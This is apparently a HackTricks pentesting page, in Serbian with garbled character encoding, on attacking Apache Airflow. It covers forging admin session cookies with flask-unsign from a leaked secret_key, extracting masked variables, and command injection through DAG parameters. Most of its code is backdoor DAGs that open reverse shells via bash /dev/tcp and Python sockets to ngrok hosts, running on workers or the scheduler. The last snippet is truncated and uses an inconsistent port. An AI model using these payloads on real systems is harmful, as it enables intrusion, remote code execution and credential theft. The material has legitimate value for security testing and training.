# Bezbednost Apache Airflow-a

<details>

{% hint style="success" %}
NauÄite i veÅ¾bajte hakovanje AWS-a:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Ekspert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
NauÄite i veÅ¾bajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Ekspert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Osnovne informacije

[**Apache Airflow**](https://airflow.apache.org) sluÅ¾i kao platforma za **orkestraciju i zakazivanje data pipelina ili radnih tokova**. Pojam "orkestracija" u kontekstu data pipelina oznaÄava proces organizovanja, koordinacije i upravljanja kompleksnim data radnim tokovima koji potiÄu iz razliÄitih izvora. Osnovna svrha ovih orkestriranih data pipelina je da obezbede obraÄ‘ene i upotrebljive skupove podataka. Ovi skupovi podataka se Å¡iroko koriste od strane raznih aplikacija, ukljuÄujuÄ‡i, ali ne ograniÄavajuÄ‡i se na alate za poslovnu inteligenciju, modele za nauku o podacima i maÅ¡insko uÄenje, koji su osnovni za funkcionisanje aplikacija velikih podataka.

U osnovi, Apache Airflow Ä‡e vam omoguÄ‡iti da **zakazujete izvrÅ¡avanje koda kada se neÅ¡to** (dogaÄ‘aj, cron) **desi**.

## Lokalni Lab

### Docker-Compose

MoÅ¾ete koristiti **docker-compose konfiguracioni fajl sa** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) da pokrenete kompletan apache airflow docker okruÅ¾enje. (Ako koristite MacOS, obavezno dodelite barem 6GB RAM-a docker virtuelnoj maÅ¡ini).

### Minikube

Jedan jednostavan naÄin da **pokrenete apache airflow** je da ga pokrenete **sa minikube-om**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Konfiguracija Airflow-a

Airflow moÅ¾e Äuvati **osetljive informacije** u svojoj konfiguraciji ili moÅ¾ete pronaÄ‡i slabe konfiguracije:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Pre nego Å¡to poÄnete napadati Airflow, trebalo bi da razumete **kako dozvole funkcioniÅ¡u**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Napadi

### Enumeracija Web Konzole

Ako imate **pristup web konzoli**, moÅ¾da Ä‡ete moÄ‡i da pristupite nekim ili svim sledeÄ‡im informacijama:

* **Promenljive** (Ovde se moÅ¾da Äuvaju prilagoÄ‘ene osetljive informacije)
* **Konekcije** (Ovde se moÅ¾da Äuvaju prilagoÄ‘ene osetljive informacije)
* Pristupite im na `http://<airflow>/connection/list/`
* [**Konfiguracija**](./#airflow-configuration) (Osetljive informacije poput **`secret_key`** i lozinke mogu biti ovde saÄuvane)
* Lista **korisnika i uloga**
* **Kod svakog DAG-a** (koji moÅ¾e sadrÅ¾ati zanimljive informacije)

### Dobijanje Vrednosti Promenljivih

Promenljive se mogu Äuvati u Airflow-u tako da **DAG-ovi** mogu **pristupiti** njihovim vrednostima. SliÄno je tajnama drugih platformi. Ako imate **dovoljno dozvola**, moÅ¾ete im pristupiti u GUI-u na `http://<airflow>/variable/list/`.\
Airflow Ä‡e podrazumevano prikazati vrednost promenljive u GUI-u, meÄ‘utim, prema [**ovome**](https://marclamberti.com/blog/variables-with-apache-airflow/), moguÄ‡e je postaviti **listu promenljivih** Äija Ä‡e **vrednost** biti prikazana kao **zvezdice** u **GUI-u**.

![](<../../.gitbook/assets/image (164).png>)

MeÄ‘utim, ove **vrednosti** i dalje mogu biti **dobijene** putem **CLI**-ja (morate imati pristup bazi podataka), **proizvoljno izvrÅ¡avanje DAG-a**, **API** pristupanje taÄki promenljivih (API mora biti aktiviran) i **Äak sam GUI!**\
Da biste pristupili tim vrednostima iz GUI-a, jednostavno **izaberite promenljive** do kojih Å¾elite da pristupite i **kliknite na Akcije -> Izvoz**.\
JoÅ¡ jedan naÄin je izvrÅ¡iti **bruteforce** na **skrivenoj vrednosti** koristeÄ‡i **pretragu filtriranja** dok je ne dobijete:

![](<../../.gitbook/assets/image (152).png>)

### Eskalacija Privilegija

Ako je konfiguracija **`expose_config`** postavljena na **True**, od **korisniÄke uloge** i **naniÅ¾e** mogu **Äitati** **konfiguraciju na webu**. U ovoj konfiguraciji, **`secret_key`** se pojavljuje, Å¡to znaÄi da bilo koji korisnik sa ovim validnim kljuÄem moÅ¾e **napraviti svoj potpisani kolaÄiÄ‡ da se predstavi kao bilo koji drugi korisniÄki nalog**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG Povratna vrata (RCE u Airflow radniku)

Ako imate **pristup za pisanje** na mestu gde su **DAG-ovi saÄuvani**, moÅ¾ete jednostavno **napraviti jedan** koji Ä‡e vam poslati **povratnu ljusku**.\
Imajte na umu da Ä‡e se ova povratna ljuska izvrÅ¡iti unutar **kontejnera za Airflow radnika**:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG Povratna vrata (RCE u Airflow planeru)

Ako postavite neÅ¡to da se **izvrÅ¡i u korenu koda**, u trenutku pisanja ovog teksta, to Ä‡e biti **izvrÅ¡eno od strane planera** nakon nekoliko sekundi od postavljanja u fasciklu DAG-a.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### Kreiranje DAG-a

Ukoliko uspete da **kompromitujete maÅ¡inu unutar DAG klastera**, moÅ¾ete kreirati nove **DAG skripte** u `dags/` folderu i one Ä‡e biti **replikovane na ostalim maÅ¡inama** unutar DAG klastera.

### Umetanje Koda u DAG

Kada izvrÅ¡ite DAG iz GUI-ja, moÅ¾ete **proslediti argumente**.\
Stoga, ukoliko DAG nije pravilno napisan, moÅ¾e biti **ranjiv na Umetanje Komandi.**\
To se desilo u ovom CVE-u: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Sve Å¡to treba da znate da biste **poÄeli da traÅ¾ite umetanja komandi u DAG-ovima** jeste da se **parametri** **pristupaju** kÃ´dom **`dag_run.conf.get("ime_parametra")`**.

Osim toga, ista ranjivost moÅ¾e se pojaviti i sa **promenljivima** (imajte na umu da sa dovoljno privilegija moÅ¾ete **kontrolisati vrednost promenljivih** u GUI-ju). Promenljive se **pristupaju sa**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Ako se na primer koriste unutar bash komande, moguÄ‡e je izvrÅ¡iti ubacivanje komande.

<details>

{% hint style="success" %}
NauÄite i veÅ¾bajte hakovanje AWS-a:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
NauÄite i veÅ¾bajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
